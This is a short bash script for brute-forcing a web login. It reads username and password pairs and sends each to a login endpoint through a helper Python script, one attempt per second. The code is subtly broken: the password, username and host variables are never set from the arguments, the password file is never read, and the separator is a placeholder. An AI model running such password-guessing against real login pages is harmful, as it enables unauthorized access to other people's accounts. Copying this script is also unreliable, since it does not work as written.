#!/bin/bash

# Check for expected arguments
if [ "$#" -ne 4 ]; then
    echo "Usage: $0 <SEND_REQUEST_PYTHON_FULL_PATH> <passwords_file_path> <username_file_path> <login_endpoint_path>"
    exit 1
fi

# Full path to send_request.py and login endpoint path
SEND_REQUEST_PY=/path/to/your/send_request.py
LOGIN_ENDPOINT=$4

# Safety checks to ensure files are valid and not empty
if [ ! -f "$SEND_REQUEST_PY" ]; then
    echo "Error: $SEND_REQUEST_PY not found"
    exit 1
fi

if [ ! -f "$PASSWORDS_FILE" ] || [ ! "$(ls -A $PASSWORDS_FILE)" ]; then
    echo "Error: $PASSWORDS_FILE file not found or empty"
    exit 1
fi

if [ ! -f "$USERNAMES_FILE" ] || [ ! "$(ls -A $USERNAMES_FILE)" ]; then
    echo "Error: $USERNAMES_FILE file not found or empty"
    exit 1
fi

# Function to attempt login for each pair
attempt_login() {
    while IFS='<SEPARATOR>' read -r user password; do
        echo -e "\nAttempting login as $user:"
        python3 $SEND_REQUEST_PY "$(echo "$HOST" | awk -F/ '{print $4}')$LOGIN_ENDPOINT" $user $password
        sleep 1  # Delay per login attempt
    done < "$USERNAMES_FILE"
}

# Example usage:
# Thoroughly replace the logging part as per your authorization and logging strategy
echo "Starting brute force test... "
attempt_login "$SEND_REQUEST_PY" "$PASSWORDS_FILE" "$USERNAMES_FILE"
